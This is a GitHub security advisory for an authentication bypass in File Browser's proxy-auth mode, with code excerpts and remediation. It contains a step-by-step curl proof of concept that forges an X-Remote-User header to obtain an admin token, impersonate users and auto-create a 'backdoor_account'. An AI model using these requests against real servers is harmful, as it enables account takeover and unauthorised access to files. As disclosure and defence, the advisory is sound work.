# [C] File Browser: Authentication Bypass via Proxy Auth Header Forgery

## Summary
Severity: Critical
Advisory: GHSA-xqp3-jq6g-x3qm
CVE: CVE-2026-54089
CWE: CWE-287, CWE-290
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=2.0.0-rc.1

## Details
## Summary

When FileBrowser is configured with proxy authentication (`auth.method=proxy`), any unauthenticated attacker who can reach the server directly can impersonate **any user - including admin** - by sending a single forged HTTP header. No credentials are required. Additionally, specifying a non-existent username causes the server to **automatically create a new user account**, providing an account creation primitive with no authorization.

**This is an already known issue that has been documented in the documentation for several years, but has not been documented as a vulnerability before.**

## Severity

**HIGH** - CVSS 3.1: **8.1** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Affected Component

- **File:** [`auth/proxy.go`](https://github.com/filebrowser/filebrowser/blob/main/auth/proxy.go), lines 21-28
- **CWE:** [CWE-287](https://cwe.mitre.org/data/definitions/287.html) (Improper Authentication), [CWE-290](https://cwe.mitre.org/data/definitions/290.html) (Authentication Bypass by Spoofing)
- **Affected versions:** All versions supporting `auth.method=proxy`

## Prerequisite: Proxy Auth Must Be Enabled

This vulnerability is **NOT exploitable on default configuration** (`auth.method=json`). It requires the administrator to have configured proxy authentication mode. However, this is a **common production deployment pattern** - many organizations run FileBrowser behind a reverse proxy that handles SSO/LDAP/OAuth authentication:

- **nginx** + Authelia / Authentik
- **Traefik** + OAuth2 Proxy
- **Caddy** + forward_auth
- **Apache** + mod_auth_ldap

In these setups, the proxy authenticates the user and passes the username via HTTP header (e.g., `X-Remote-User`). FileBrowser trusts this header to identify the user.

| Deployment Scenario | Exploitable? |
|---|---|
| Default install (`auth.method=json`) | **No** — JSON auth uses password verification |
| `auth.method=proxy` + FileBrowser only reachable via proxy (bound to `127.0.0.1` or firewalled) | **No** - attacker cannot reach the server directly |
| `auth.method=proxy` + FileBrowser port exposed to network | **Yes - full admin takeover** |

The third scenario is common because:
- Docker containers publish ports to `0.0.0.0` by default (e.g., `-p 8085:80`)
- Administrators expose the port for debugging, monitoring, or health checks
- Cloud deployments may have misconfigured security groups or load balancers
- Internal networks often lack strict micro-segmentation

The core issue is that the **code itself has zero defensive checks** — no trusted IP validation, no shared secret, no origin verification. The entire security model relies on network-level isolation, which is fragile and not documented as a hard requirement.

## Root Cause

The `ProxyAuth.Auth()` function unconditionally trusts the value of an HTTP request header (configured via `auth.header`, e.g. `X-Remote-User`) to determine the authenticated user's identity. There are **three distinct problems** in this code:

### Problem 1: No Origin Validation

The function reads the header from **any** HTTP request regardless of source IP. It does not verify that the request originated from a trusted reverse proxy. Any client on the network can set arbitrary HTTP headers.

**File: [`auth/proxy.go`](https://github.com/filebrowser/filebrowser/blob/main/auth/proxy.go), lines 21-28:**

```go
func (a ProxyAuth) Auth(r *http.Request, usr users.Store, setting *settings.Settings, srv *settings.Server) (*users.User, error) {
    username := r.Header.Get(a.Header)  // <-- reads attacker-controlled header, no origin check
    user, err := usr.Get(srv.Root, username)
    if errors.Is(err, fberrors.ErrNotExist) {
        return a.createUser(usr, setting, srv, username)
    }
    return user, err  // <-- returns the user object, no password verification
}
```

There is no call to verify `r.RemoteAddr` against a list of trusted proxy IPs, no shared secret validation, and no signature check on the header value.

### Problem 2: No Password Verification

Unlike JSON auth (`auth/json.go`) which validates the password via bcrypt, the proxy auth path returns the user object directly from the database based solely on the header value. The `loginHandler` in `http/auth.go` then mints a valid JWT for this user:

**File: [`http/auth.go`](https://github.com/filebrowser/filebrowser/blob/main/http/auth.go), lines 121-137:**

```go
func loginHandler(tokenExpireTime time.Duration) handleFunc {
    return func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
        auther, err := d.store.Auth.Get(d.settings.AuthMethod)
        // ...
        user, err := auther.Auth(r, d.store.Users, d.settings, d.server)
        // No additional verification — if auther.Auth() returns a user, a JWT is minted
        return printToken(w, r, d, user, tokenExpireTime)  // <-- signs and returns JWT
    }
}
```

### Problem 3: Automatic User Creation

If the username in the header doesn't exist in the database, `createUser()` is called unconditionally. This creates a real user account with default permissions, a random locked password, and a home directory:

**File: [`auth/proxy.go`](https://github.com/filebrowser/filebrowser/blob/main/auth/proxy.go), lines 30-63:**

```go
func (a ProxyAuth) createUser(usr users.Store, setting *settings.Settings, srv *settings.Server, username string) (*users.User, error) {
    pwd, err := users.RandomPwd(randomPasswordLength)
    // ...
    user := &users.User{
        Username:     username,       // <-- attacker-controlled
        Password:     hashedRandomPassword,
        LockPassword: true,
    }
    setting.Defaults.Apply(user)      // <-- inherits default permissions (may include execute, create, etc.)
    // ...
    err = usr.Save(user)              // <-- persisted to database
    return user, nil
}
```

This auto-creation has no opt-in flag — it is always active when proxy auth is enabled.

### Complete Attack Flow

```
Attacker sends:   POST /api/login  +  Header: X-Remote-User: admin
                                         |
loginHandler()                           |
  |-> d.store.Auth.Get("proxy")         |
  |-> auther.Auth(r, ...)               |
        |-> ProxyAuth.Auth()             |
              |-> r.Header.Get("X-Remote-User")  ->  "admin"     (attacker-controlled)
              |-> usr.Get(root, "admin")          ->  admin user  (found in DB)
              |-> return user, nil                ->  no password check
  |-> printToken(w, r, d, user, ...)    |
        |-> jwt.NewWithClaims(HS256, claims{user: admin, perm: {admin: true}})
        |-> token.SignedString(key)     ->  valid admin JWT returned to attacker
```

## Proof of Concept

Here is Log testing using Low Privileges Account attacker, get forbidden
Login as low priv user then get the auth token `"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjozLCJsb2NhbGUiOiIiLCJ2aWV3TW9kZSI6Imxpc3QiLCJzaW5nbGVDbGljayI6ZmFsc2UsInJlZGlyZWN0QWZ0ZXJDb3B5TW92ZSI6ZmFsc2UsInBlcm0iOnsiYWRtaW4iOmZhbHNlLCJleGVjdXRlIjp0cnVlLCJjcmVhdGUiOmZhbHNlLCJyZW5hbWUiOmZhbHNlLCJtb2RpZnkiOmZhbHNlLCJkZWxldGUiOmZhbHNlLCJzaGFyZSI6ZmFsc2UsImRvd25sb2FkIjp0cnVlfSwiY29tbWFuZHMiOlsibHMiXSwibG9ja1Bhc3N3b3JkIjpmYWxzZSwiaGlkZURvdGZpbGVzIjpmYWxzZSwiZGF0ZUZvcm1hdCI6ZmFsc2UsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJhY2VFZGl0b3JUaGVtZSI6IiJ9LCJpc3MiOiJGaWxlIEJyb3dzZXIiLCJleHAiOjE3NzMwMjc2ODksImlhdCI6MTc3MzAyMDQ4OX0.NN0SqBr8lFj7QUACY2770gaGXZhBZ2qJZHDJJ7vQbNM"`

```
root@LAPTOP-VUMRCEKO:~# curl -s http://localhost:8085/api/settings \
  -H "X-Auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjozLCJsb2NhbGUiOiIiLCJ2aWV3TW9kZSI6Imxpc3QiLCJzaW5nbGVDbGljayI6ZmFsc2UsInJlZGlyZWN0QWZ0ZXJDb3B5TW92ZSI6ZmFsc2UsInBlcm0iOnsiYWRtaW4iOmZhbHNlLCJleGVjdXRlIjp0cnVlLCJjcmVhdGUiOmZhbHNlLCJyZW5hbWUiOmZhbHNlLCJtb2RpZnkiOmZhbHNlLCJkZWxldGUiOmZhbHNlLCJzaGFyZSI6ZmFsc2UsImRvd25sb2FkIjp0cnVlfSwiY29tbWFuZHMiOlsibHMiXSwibG9ja1Bhc3N3b3JkIjpmYWxzZSwiaGlkZURvdGZpbGVzIjpmYWxzZSwiZGF0ZUZvcm1hdCI6ZmFsc2UsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJhY2VFZGl0b3JUaGVtZSI6IiJ9LCJpc3MiOiJGaWxlIEJyb3dzZXIiLCJleHAiOjE3NzMwMjc2ODksImlhdCI6MTc3MzAyMDQ4OX0.NN0SqBr8lFj7QUACY2770gaGXZhBZ2qJZHDJJ7vQbNM"
403 Forbidden
root@LAPTOP-VUMRCEKO:~#
root@LAPTOP-VUMRCEKO:~#
root@LAPTOP-VUMRCEKO:~# FORGED_TOKEN=$(curl -s -X POST http://localhost:8085/api/login \
  -H "X-Remote-User: admin")
root@LAPTOP-VUMRCEKO:~#
root@LAPTOP-VUMRCEKO:~# curl -s http://localhost:8085/api/settings \
  -H "X-Auth: $FORGED_TOKEN" | python3 -m json.tool
{
    "signup": false,
    "hideLoginButton": true,
    "createUserDir": false,
    "minimumPasswordLength": 12,
    "userHomeBasePath": "/users",
    "defaults": {
        "scope": ".",
        "locale": "en",
        "viewMode": "mosaic",
        "singleClick": false,
        "redirectAfterCopyMove": true,
        "sorting": {
            "by": "",
            "asc": false
        },
        "perm": {
            "admin": false,
            "execute": true,
            "create": true,
            "rename": true,
            "modify": true,
            "delete": true,
            "share": true,
            "download": true
        },
        "commands": [],
        "hideDotfiles": false,
        "dateFormat": false,
        "aceEditorTheme": ""
    },
    "authMethod": "proxy",
    "rules": [],
    "branding": {
        "name": "",
        "disableExternal": false,
        "disableUsedPercentage": false,
        "files": "",
        "theme": "",
        "color": ""
    },
    "tus": {
        "chunkSize": 10485760,
        "retryCount": 5
    },
    "shell": [
        "/bin/sh",
        "-c"
    ],
    "commands": {
        "after_copy": [],
        "after_delete": [],
        "after_rename": [],
        "after_save": [],
        "after_upload": [],
        "before_copy": [],
        "before_delete": [],
        "before_rename": [],
        "before_save": [],
        "before_upload": []
    }
}
root@LAPTOP-VUMRCEKO:~#
```
<img width="1487" height="757" alt="image" src="https://github.com/user-attachments/assets/a777321e-14a4-4720-9f8e-423d5f7cdf74" />


### Prerequisites

- FileBrowser with proxy auth enabled:
  ```bash
  filebrowser config set --auth.method=proxy --auth.header=X-Remote-User
  ```
- Server is reachable directly (not exclusively behind the reverse proxy)

### Step 1: Confirm attacker (non-admin) is blocked

```bash
# Using a legitimate non-admin JWT token:
curl -s http://localhost:8085/api/settings \
  -H "X-Auth: <ATTACKER_JWT_TOKEN>"
```

**Result:** `403 Forbidden` — non-admin users cannot access `/api/settings`

### Step 2: Forge admin identity — no credentials needed

```bash
# Just one header, no password:
FORGED_TOKEN=$(curl -s -X POST http://localhost:8085/api/login \
  -H "X-Remote-User: admin")

echo "$FORGED_TOKEN"
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxLC... (608 bytes)
```

**Result:** Valid JWT token returned for admin user (ID: 1, `perm.admin: true`)

### Step 3: Access admin-only endpoints with forged token

```bash
# Read full server configuration (admin-only):
curl -s http://localhost:8085/api/settings \
  -H "X-Auth: $FORGED_TOKEN"
```

**Result:** `200 OK` - complete server settings returned:

```json
{
    "authMethod": "proxy",
    "shell": ["/bin/sh", "-c"],
    "signup": false,
    "defaults": { "perm": { "admin": false, "execute": true, ... } },
    ...
}
```

### Step 4: Enumerate all user accounts

```bash
curl -s http://localhost:8085/api/users \
  -H "X-Auth: $FORGED_TOKEN"
```

**Result:** All user accounts with full details (usernames, permissions, scopes, commands)

### Step 5: Impersonate any other user

```bash
# Impersonate "testuser" — access their files without knowing their password:
VICTIM_TOKEN=$(curl -s -X POST http://localhost:8085/api/login \
  -H "X-Remote-User: testuser")

curl -s http://localhost:8085/api/resources/ \
  -H "X-Auth: $VICTIM_TOKEN"
```

**Result:** Full file listing of testuser's scope

### Step 6: Auto-create a new user account

```bash
# This username doesn't exist — server creates it automatically:
NEW_TOKEN=$(curl -s -X POST http://localhost:8085/api/login \
  -H "X-Remote-User: backdoor_account")
```

**Result:** New user `backdoor_account` created in the database with default permissions, JWT returned

## Validated Results

Tested against `filebrowser/filebrowser:latest` Docker image on 2026-03-09:

| Test | Result |
|------|--------|
| Attacker token (non-admin) -> `GET /api/settings` | **`403 Forbidden`** (blocked) |
| Forged header `X-Remote-User: admin` -> `POST /api/login` | **`200 OK`** — valid admin JWT (608 bytes) |
| Forged admin token -> `GET /api/settings` | **`200 OK`** — full server config returned |
| Forged admin token -> `GET /api/users` | **`200 OK`** — all user accounts listed |
| Forged header `X-Remote-User: testuser` | **`200 OK`** — testuser JWT, files accessible |
| Forged header `X-Remote-User: nonexistent_user` | **`200 OK`** — new user auto-created, JWT returned |

## Impact

An unauthenticated attacker who can reach the FileBrowser instance directly can:

1. **Full admin takeover** — impersonate the admin user and gain complete control
2. **Read all server settings** — shell configuration, permissions, branding, rules
3. **Enumerate and impersonate all users** — access every user's files without credentials
4. **Create unlimited backdoor accounts** — auto-creation generates persistent accounts
5. **Modify server configuration** — enable command execution, change shell, alter rules
6. **Chain with other vulnerabilities** — gain admin access -> enable shell mode -> achieve RCE

**Attack cost:** Zero credentials. One HTTP header.

## Suggested Remediation

### Fix 1: Add trusted proxy IP validation (recommended)

```go
type ProxyAuth struct {
    Header         string   `json:"header"`
    TrustedProxies []string `json:"trustedProxies"` // New: list of trusted proxy IPs/CIDRs
}

func (a ProxyAuth) Auth(r *http.Request, usr users.Store, setting *settings.Settings, srv *settings.Server) (*users.User, error) {
    // Verify request originates from a trusted reverse proxy
    clientIP := realip.FromRequest(r)
    if !a.isTrustedProxy(clientIP) {
        return nil, fmt.Errorf("proxy auth: request from untrusted source %s", clientIP)
    }

    username := r.Header.Get(a.Header)
    if username == "" {
        return nil, os.ErrPermission
    }

    user, err := usr.Get(srv.Root, username)
    if errors.Is(err, fberrors.ErrNotExist) {
        if a.AutoCreateUsers {  // Make opt-in
            return a.createUser(usr, setting, srv, username)
        }
        return nil, os.ErrPermission
    }
    return user, err
}
```

### Fix 2: Make auto-user-creation opt-in

Add a configuration flag `auth.proxy.createUsers` (default: `false`) so administrators must explicitly enable automatic account creation.

### Fix 3: Documentation warning

Clearly document that when using proxy auth:
- FileBrowser **MUST NOT** be directly accessible from untrusted networks
- Bind to `127.0.0.1` or use firewall rules to ensure only the reverse proxy can reach it
- The reverse proxy **MUST** strip/overwrite the configured header from client requests

## References

- **Source file:** https://github.com/filebrowser/filebrowser/blob/main/auth/proxy.go
- **Login handler:** https://github.com/filebrowser/filebrowser/blob/main/http/auth.go#L121-L137
- **CWE-287:** https://cwe.mitre.org/data/definitions/287.html
- **CWE-290:** https://cwe.mitre.org/data/definitions/290.html
- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-xqp3-jq6g-x3qm
- https://nvd.nist.gov/vuln/detail/CVE-2026-54089
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/blob/main/auth/proxy.go
- https://github.com/filebrowser/filebrowser/blob/main/http/auth.go#L121-L137
